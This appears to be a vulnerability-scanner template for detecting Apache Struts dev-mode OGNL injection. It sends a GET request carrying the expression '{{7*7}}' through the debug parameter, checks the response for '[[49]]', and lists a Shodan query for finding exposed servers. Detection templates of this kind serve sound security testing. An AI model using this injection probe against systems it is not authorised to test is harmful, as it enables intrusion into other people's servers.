id: struts-dev-mode-ognl-injection

info:
  name: Apache Struts Dev Mode OGNL Injection
  author: tess
  severity: critical
  reference:
    - https://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/
    - https://www.exploit-db.com/exploits/31434
  metadata:
    verified: true
    shodan-query: html:"Struts Problem Report"
  tags: apache,struts,ognl,misconfig

requests:
  - method: GET
    path:
      - '{{BaseURL}}/portal/displayAPSForm.action?debug=command&expression={{7*7}}'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '[[49]]'

      - type: status
        status:
          - 200
